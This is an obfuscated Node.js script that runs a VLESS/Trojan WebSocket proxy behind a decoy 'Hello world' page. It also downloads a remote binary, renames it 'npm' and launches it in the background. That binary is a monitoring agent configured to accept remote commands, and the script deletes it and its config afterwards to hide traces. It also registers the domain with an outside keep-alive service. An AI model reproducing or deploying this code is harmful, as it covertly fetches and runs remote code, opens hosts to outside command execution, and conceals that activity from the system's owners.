const _0x532040=_0x2cc3;(function(_0x5877e8,_0xeda6db){const _0x43aeac=_0x2cc3,_0x2828fc=_0x5877e8();while(!![]){try{const _0x36c3a5=parseInt(_0x43aeac(0x168))/0x1*(parseInt(_0x43aeac(0x128))/0x2)+parseInt(_0x43aeac(0x153))/0x3*(-parseInt(_0x43aeac(0x12a))/0x4)+parseInt(_0x43aeac(0x151))/0x5+parseInt(_0x43aeac(0x144))/0x6*(-parseInt(_0x43aeac(0x142))/0x7)+-parseInt(_0x43aeac(0x155))/0x8+parseInt(_0x43aeac(0x111))/0x9*(parseInt(_0x43aeac(0x121))/0xa)+parseInt(_0x43aeac(0x12b))/0xb*(-parseInt(_0x43aeac(0x164))/0xc);if(_0x36c3a5===_0xeda6db)break;else _0x2828fc['push'](_0x2828fc['shift']());}catch(_0x695ecc){_0x2828fc['push'](_0x2828fc['shift']());}}}(_0x4490,0xeca2c));const os=require('os'),http=require(_0x532040(0x11d)),fs=require('fs'),axios=require(_0x532040(0x12e)),net=require(_0x532040(0x13f)),path=require('path'),crypto=require(_0x532040(0x15f)),{Buffer}=require(_0x532040(0x119)),{exec,execSync}=require(_0x532040(0x109)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x532040(0x10f)][_0x532040(0x12c)]||_0x532040(0x138),NEZHA_SERVER=process[_0x532040(0x10f)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x532040(0x10f)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x532040(0x10f)][_0x532040(0xfd)]||'',DOMAIN=process[_0x532040(0x10f)]['DOMAIN']||'1234.abc.com',AUTO_ACCESS=process[_0x532040(0x10f)][_0x532040(0x16c)]||!![],WSPATH=process[_0x532040(0x10f)][_0x532040(0x163)]||UUID[_0x532040(0x13c)](0x0,0x8),SUB_PATH=process['env'][_0x532040(0x104)]||_0x532040(0x11a),NAME=process[_0x532040(0x10f)]['NAME']||_0x532040(0x14b),PORT=process[_0x532040(0x10f)][_0x532040(0x101)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x2300c7=_0x532040;try{const _0x502d94=await axios[_0x2300c7(0x127)](_0x2300c7(0x15c)),_0x25a4ac=_0x502d94[_0x2300c7(0x154)];ISP=(_0x25a4ac['country']+'-'+_0x25a4ac[_0x2300c7(0x15b)])[_0x2300c7(0x150)](/ /g,'_');}catch(_0x1b981a){ISP=_0x2300c7(0x10d);}};GetISP();const httpServer=http[_0x532040(0x123)]((_0x2d4c61,_0x1e8e7e)=>{const _0x34135b=_0x532040;if(_0x2d4c61[_0x34135b(0x170)]==='/'){const _0x1617a5=path['join'](__dirname,_0x34135b(0x100));fs[_0x34135b(0xff)](_0x1617a5,_0x34135b(0x10e),(_0x4933dc,_0x1d79a4)=>{const _0x502bcd=_0x34135b;if(_0x4933dc){_0x1e8e7e[_0x502bcd(0x141)](0xc8,{'Content-Type':_0x502bcd(0x126)}),_0x1e8e7e['end'](_0x502bcd(0xfe));return;}_0x1e8e7e[_0x502bcd(0x141)](0xc8,{'Content-Type':_0x502bcd(0x126)}),_0x1e8e7e[_0x502bcd(0x140)](_0x1d79a4);});return;}else{if(_0x2d4c61[_0x34135b(0x170)]==='/'+SUB_PATH){const _0x2b966b='vless://'+UUID+'@'+DOMAIN+_0x34135b(0x14e)+DOMAIN+_0x34135b(0x16f)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x4ae62a=_0x34135b(0x157)+UUID+'@'+DOMAIN+_0x34135b(0x158)+DOMAIN+_0x34135b(0x16f)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0xbc3ceb=_0x2b966b+'\x0a'+_0x4ae62a,_0x75d45a=Buffer['from'](_0xbc3ceb)[_0x34135b(0x15a)]('base64');_0x1e8e7e['writeHead'](0xc8,{'Content-Type':_0x34135b(0x16b)}),_0x1e8e7e[_0x34135b(0x140)](_0x75d45a+'\x0a');}else _0x1e8e7e['writeHead'](0x194,{'Content-Type':_0x34135b(0x16b)}),_0x1e8e7e[_0x34135b(0x140)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x532040(0x102))]({'server':httpServer}),uuid=UUID[_0x532040(0x150)](/-/g,''),DNS_SERVERS=[_0x532040(0x13d),'1.1.1.1'];function resolveHost(_0x592feb){return new Promise((_0x13652d,_0x2d3974)=>{const _0x16434d=_0x2cc3;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x16434d(0x103)](_0x592feb)){_0x13652d(_0x592feb);return;}let _0x55512a=0x0;function _0x4920b8(){const _0x238e74=_0x16434d;if(_0x55512a>=DNS_SERVERS['length']){_0x2d3974(new Error(_0x238e74(0x10c)+_0x592feb+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x43d5db=DNS_SERVERS[_0x55512a];_0x55512a++;const _0x19c917=_0x238e74(0x13b)+encodeURIComponent(_0x592feb)+_0x238e74(0x125);axios['get'](_0x19c917,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x238e74(0x149)](_0x4e53c3=>{const _0x20fcb6=_0x238e74,_0xe5e54=_0x4e53c3[_0x20fcb6(0x154)];if(_0xe5e54[_0x20fcb6(0xfb)]===0x0&&_0xe5e54['Answer']&&_0xe5e54[_0x20fcb6(0x147)][_0x20fcb6(0x14d)]>0x0){const _0x5d6c58=_0xe5e54[_0x20fcb6(0x147)][_0x20fcb6(0x136)](_0x1ca104=>_0x1ca104[_0x20fcb6(0x113)]===0x1);if(_0x5d6c58){_0x13652d(_0x5d6c58[_0x20fcb6(0x154)]);return;}}_0x4920b8();})[_0x238e74(0x156)](_0x1e038d=>{_0x4920b8();});}_0x4920b8();});}function _0x4490(){const _0x17e8c4=['utf8','env','includes','1503tcSnUL','readUInt8','type','application/json','https://oooo.serv00.net/add-url','update','npm\x20running\x20error:','pipe','buffer','sub','https://arm64.ssss.nyc.mn/v1','join','http','setsid\x20nohup\x20./npm\x20-s\x20','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','aarch64','104590HtYWSH','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','createServer','concat','&type=A','text/html','get','2222KgwCjv','error','145364wnwpcg','29249qSdgPN','UUID','npm','axios','client_secret:\x20','every','2087','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','write','reduce','config.yaml','find','connect','1522c7ba-9766-4242-8ef8-247480a30fa9','Server\x20is\x20running\x20on\x20port\x20','2083','https://dns.google/resolve?name=','slice','8.8.4.4','npm\x20is\x20running','net','end','writeHead','1868524HGyyVI','chmod\x20+x\x20npm','24tULzZI','writeFileSync','pop','Answer','substr','then','true','Hug','once','length',':443?encryption=none&security=tls&sni=','split','replace','6260950XmasGH','readUInt16BE','66sXLnpa','data','5398192yGtJpr','catch','trojan://',':443?security=tls&sni=','finish','toString','asOrganization','https://speed.cloudflare.com/meta','listen','connection','crypto','unlink','error:\x20','false','WSPATH','3288WXAwDY','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','2096','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','1117fdlOmy','https://amd64.ssss.nyc.mn/agent','stream','text/plain','AUTO_ACCESS','message','log','&fp=chrome&type=ws&host=','url','https://','close','https://arm64.ssss.nyc.mn/agent','Status','digest','NEZHA_KEY','Hello\x20world!','readFile','index.html','PORT','Server','test','SUB_PATH','map','\x20-p\x20','hex','arm64','child_process','443','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Failed\x20to\x20resolve\x20','Unknown'];_0x4490=function(){return _0x17e8c4;};return _0x4490();}function handleVlessConnection(_0x46c7f4,_0x44e8be){const _0x1653aa=_0x532040,[_0x2f7b03]=_0x44e8be,_0x315658=_0x44e8be[_0x1653aa(0x13c)](0x1,0x11);if(!_0x315658[_0x1653aa(0x130)]((_0x334df2,_0x1bfb28)=>_0x334df2==parseInt(uuid[_0x1653aa(0x148)](_0x1bfb28*0x2,0x2),0x10)))return![];let _0x540966=_0x44e8be['slice'](0x11,0x12)[_0x1653aa(0x112)]()+0x13;const _0x14f19a=_0x44e8be[_0x1653aa(0x13c)](_0x540966,_0x540966+=0x2)[_0x1653aa(0x152)](0x0),_0x3682ac=_0x44e8be[_0x1653aa(0x13c)](_0x540966,_0x540966+=0x1)[_0x1653aa(0x112)](),_0x2fedea=_0x3682ac==0x1?_0x44e8be['slice'](_0x540966,_0x540966+=0x4)[_0x1653aa(0x11c)]('.'):_0x3682ac==0x2?new TextDecoder()['decode'](_0x44e8be[_0x1653aa(0x13c)](_0x540966+0x1,_0x540966+=0x1+_0x44e8be['slice'](_0x540966,_0x540966+0x1)[_0x1653aa(0x112)]())):_0x3682ac==0x3?_0x44e8be[_0x1653aa(0x13c)](_0x540966,_0x540966+=0x10)['reduce']((_0x30e57a,_0x2e5909,_0xbeeb99,_0x2e0e03)=>_0xbeeb99%0x2?_0x30e57a[_0x1653aa(0x124)](_0x2e0e03[_0x1653aa(0x13c)](_0xbeeb99-0x1,_0xbeeb99+0x1)):_0x30e57a,[])[_0x1653aa(0x105)](_0x37afff=>_0x37afff[_0x1653aa(0x152)](0x0)['toString'](0x10))[_0x1653aa(0x11c)](':'):'';_0x46c7f4['send'](new Uint8Array([_0x2f7b03,0x0]));const _0x22c7a5=createWebSocketStream(_0x46c7f4);return resolveHost(_0x2fedea)['then'](_0x61927e=>{const _0x4ad6da=_0x1653aa;net[_0x4ad6da(0x137)]({'host':_0x61927e,'port':_0x14f19a},function(){const _0x473520=_0x4ad6da;this[_0x473520(0x133)](_0x44e8be[_0x473520(0x13c)](_0x540966)),_0x22c7a5['on'](_0x473520(0x129),()=>{})[_0x473520(0x118)](this)['on']('error',()=>{})['pipe'](_0x22c7a5);})['on'](_0x4ad6da(0x129),()=>{});})[_0x1653aa(0x156)](_0x4f4b04=>{const _0x3ece8b=_0x1653aa;net[_0x3ece8b(0x137)]({'host':_0x2fedea,'port':_0x14f19a},function(){const _0x342f06=_0x3ece8b;this[_0x342f06(0x133)](_0x44e8be['slice'](_0x540966)),_0x22c7a5['on']('error',()=>{})[_0x342f06(0x118)](this)['on'](_0x342f06(0x129),()=>{})[_0x342f06(0x118)](_0x22c7a5);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x39b70f,_0x49f715){const _0x5bd278=_0x532040;try{if(_0x49f715['length']<0x3a)return![];const _0x1f5b2c=_0x49f715[_0x5bd278(0x13c)](0x0,0x38)[_0x5bd278(0x15a)](),_0x4d9f04=[UUID];let _0x4ec0fa=null;for(const _0x1eac88 of _0x4d9f04){const _0x40c540=crypto['createHash']('sha224')[_0x5bd278(0x116)](_0x1eac88)[_0x5bd278(0xfc)](_0x5bd278(0x107));if(_0x40c540===_0x1f5b2c){_0x4ec0fa=_0x1eac88;break;}}if(!_0x4ec0fa)return![];let _0x439efa=0x38;_0x49f715[_0x439efa]===0xd&&_0x49f715[_0x439efa+0x1]===0xa&&(_0x439efa+=0x2);const _0x36f6dd=_0x49f715[_0x439efa];if(_0x36f6dd!==0x1)return![];_0x439efa+=0x1;const _0x1fff1d=_0x49f715[_0x439efa];_0x439efa+=0x1;let _0x1aab48,_0x30272c;if(_0x1fff1d===0x1)_0x1aab48=_0x49f715[_0x5bd278(0x13c)](_0x439efa,_0x439efa+0x4)[_0x5bd278(0x11c)]('.'),_0x439efa+=0x4;else{if(_0x1fff1d===0x3){const _0x2a1978=_0x49f715[_0x439efa];_0x439efa+=0x1,_0x1aab48=_0x49f715[_0x5bd278(0x13c)](_0x439efa,_0x439efa+_0x2a1978)['toString'](),_0x439efa+=_0x2a1978;}else{if(_0x1fff1d===0x4)_0x1aab48=_0x49f715['slice'](_0x439efa,_0x439efa+0x10)[_0x5bd278(0x134)]((_0x5047f6,_0x51948d,_0x603b6a,_0x5903cb)=>_0x603b6a%0x2?_0x5047f6[_0x5bd278(0x124)](_0x5903cb[_0x5bd278(0x13c)](_0x603b6a-0x1,_0x603b6a+0x1)):_0x5047f6,[])[_0x5bd278(0x105)](_0x37f1e8=>_0x37f1e8[_0x5bd278(0x152)](0x0)[_0x5bd278(0x15a)](0x10))['join'](':'),_0x439efa+=0x10;else return![];}}_0x30272c=_0x49f715[_0x5bd278(0x152)](_0x439efa),_0x439efa+=0x2;_0x439efa<_0x49f715[_0x5bd278(0x14d)]&&_0x49f715[_0x439efa]===0xd&&_0x49f715[_0x439efa+0x1]===0xa&&(_0x439efa+=0x2);const _0x1d8d70=createWebSocketStream(_0x39b70f);return resolveHost(_0x1aab48)[_0x5bd278(0x149)](_0x13bc4d=>{const _0x11e98e=_0x5bd278;net[_0x11e98e(0x137)]({'host':_0x13bc4d,'port':_0x30272c},function(){const _0x5e0649=_0x11e98e;_0x439efa<_0x49f715['length']&&this[_0x5e0649(0x133)](_0x49f715[_0x5e0649(0x13c)](_0x439efa)),_0x1d8d70['on'](_0x5e0649(0x129),()=>{})[_0x5e0649(0x118)](this)['on'](_0x5e0649(0x129),()=>{})[_0x5e0649(0x118)](_0x1d8d70);})['on'](_0x11e98e(0x129),()=>{});})[_0x5bd278(0x156)](_0x3e4f75=>{const _0x2e7f4c=_0x5bd278;net['connect']({'host':_0x1aab48,'port':_0x30272c},function(){const _0x243f85=_0x2cc3;_0x439efa<_0x49f715[_0x243f85(0x14d)]&&this['write'](_0x49f715[_0x243f85(0x13c)](_0x439efa)),_0x1d8d70['on'](_0x243f85(0x129),()=>{})[_0x243f85(0x118)](this)['on'](_0x243f85(0x129),()=>{})[_0x243f85(0x118)](_0x1d8d70);})['on'](_0x2e7f4c(0x129),()=>{});}),!![];}catch(_0x547e3b){return![];}}wss['on'](_0x532040(0x15e),(_0x5d36c4,_0xf2e0b8)=>{const _0x430f2b=_0x532040,_0xeb980d=_0xf2e0b8[_0x430f2b(0x170)]||'';_0x5d36c4[_0x430f2b(0x14c)](_0x430f2b(0x16d),_0x1c9a76=>{const _0x2c090a=_0x430f2b;if(_0x1c9a76[_0x2c090a(0x14d)]>0x11&&_0x1c9a76[0x0]===0x0){const _0x49ce01=_0x1c9a76[_0x2c090a(0x13c)](0x1,0x11),_0x486ae6=_0x49ce01[_0x2c090a(0x130)]((_0x3154ed,_0x3434c7)=>_0x3154ed==parseInt(uuid[_0x2c090a(0x148)](_0x3434c7*0x2,0x2),0x10));if(_0x486ae6){!handleVlessConnection(_0x5d36c4,_0x1c9a76)&&_0x5d36c4[_0x2c090a(0xf9)]();return;}}!handleTrojanConnection(_0x5d36c4,_0x1c9a76)&&_0x5d36c4['close']();})['on'](_0x430f2b(0x129),()=>{});});const getDownloadUrl=()=>{const _0x351e5f=_0x532040,_0x4f638e=os['arch']();return _0x4f638e==='arm'||_0x4f638e===_0x351e5f(0x108)||_0x4f638e===_0x351e5f(0x120)?!NEZHA_PORT?_0x351e5f(0x11b):_0x351e5f(0xfa):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x351e5f(0x169);},downloadFile=async()=>{const _0x41a392=_0x532040;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x47fb6e=getDownloadUrl(),_0x3e1b36=await axios({'method':'get','url':_0x47fb6e,'responseType':_0x41a392(0x16a)}),_0x4ea920=fs['createWriteStream'](_0x41a392(0x12d));return _0x3e1b36['data'][_0x41a392(0x118)](_0x4ea920),new Promise((_0x3f66d6,_0x31d228)=>{const _0x5178b0=_0x41a392;_0x4ea920['on'](_0x5178b0(0x159),()=>{const _0x5502cf=_0x5178b0;console[_0x5502cf(0x16e)]('npm\x20download\x20successfully'),exec(_0x5502cf(0x143),_0x1296fe=>{if(_0x1296fe)_0x31d228(_0x1296fe);_0x3f66d6();});}),_0x4ea920['on'](_0x5178b0(0x129),_0x31d228);});}catch(_0x436ae0){throw _0x436ae0;}},runnz=async()=>{const _0x3a1e84=_0x532040;try{const _0x277fc9=execSync(_0x3a1e84(0x132),{'encoding':'utf-8'});if(_0x277fc9['trim']()!==''){console[_0x3a1e84(0x16e)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x442393){}await downloadFile();let _0x23b7aa='',_0x2dc947=[_0x3a1e84(0x10a),'8443',_0x3a1e84(0x166),_0x3a1e84(0x131),_0x3a1e84(0x13a),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x4550ef=_0x2dc947[_0x3a1e84(0x110)](NEZHA_PORT)?'--tls':'';_0x23b7aa=_0x3a1e84(0x11e)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3a1e84(0x106)+NEZHA_KEY+'\x20'+_0x4550ef+_0x3a1e84(0x10b);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1ace21=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x3a1e84(0x14f)](':')[_0x3a1e84(0x146)]():'',_0x5875e1=_0x2dc947[_0x3a1e84(0x110)](_0x1ace21)?_0x3a1e84(0x14a):_0x3a1e84(0x162),_0x3be46d=_0x3a1e84(0x12f)+NEZHA_KEY+_0x3a1e84(0x167)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x5875e1+_0x3a1e84(0x165)+UUID;fs[_0x3a1e84(0x145)](_0x3a1e84(0x135),_0x3be46d);}_0x23b7aa=_0x3a1e84(0x11f);}else{console[_0x3a1e84(0x16e)](_0x3a1e84(0x122));return;}}try{exec(_0x23b7aa,{'shell':'/bin/bash'},_0x5020c0=>{const _0x26aaa2=_0x3a1e84;if(_0x5020c0)console[_0x26aaa2(0x129)](_0x26aaa2(0x117),_0x5020c0);else console[_0x26aaa2(0x16e)](_0x26aaa2(0x13e));});}catch(_0x205281){console[_0x3a1e84(0x129)](_0x3a1e84(0x161)+_0x205281);}};async function addAccessTask(){const _0x2d02ff=_0x532040;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x142bd1=_0x2d02ff(0x171)+DOMAIN;try{const _0x1529dd=await axios['post'](_0x2d02ff(0x115),{'url':_0x142bd1},{'headers':{'Content-Type':_0x2d02ff(0x114)}});console[_0x2d02ff(0x16e)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x1c05c3){}}const delFiles=()=>{const _0x49ea8a=_0x532040;fs[_0x49ea8a(0x160)]('npm',()=>{}),fs[_0x49ea8a(0x160)]('config.yaml',()=>{});};function _0x2cc3(_0x56c173,_0x49cdf5){const _0x449059=_0x4490();return _0x2cc3=function(_0x2cc380,_0x2ffceb){_0x2cc380=_0x2cc380-0xf9;let _0x372b0c=_0x449059[_0x2cc380];return _0x372b0c;},_0x2cc3(_0x56c173,_0x49cdf5);}httpServer[_0x532040(0x15d)](PORT,()=>{const _0x57aa2a=_0x532040;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x57aa2a(0x16e)](_0x57aa2a(0x139)+PORT);});
